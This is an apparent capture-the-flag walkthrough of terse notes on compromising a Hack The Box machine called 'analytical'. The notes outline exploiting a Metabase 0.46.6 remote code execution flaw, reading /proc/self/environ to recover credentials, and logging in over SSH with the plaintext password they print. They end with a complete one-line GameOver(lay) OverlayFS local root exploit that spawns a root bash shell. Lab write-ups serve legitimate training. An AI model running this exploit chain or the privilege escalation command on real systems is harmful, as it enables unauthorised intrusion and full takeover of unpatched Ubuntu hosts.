port : 80

login redirect -> http://data.analytical.htb

run burpsuite -> /api/session/propreties

exploit metabase 0.46.6 Cve -> RCE 

/proc/self/environ 

ssh to metalytics:An4lytics_ds20223#@analytical.htb

-----
privesc :

no sudoer & linepeas gave nothing , so just go for kernel exploit

uname -a -> 6.2.0-25-generic

6.2.0-25-generic : CVE-2023-2640 and CVE-2023-32629, aka GameOver(lay)

exploit.sh :

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
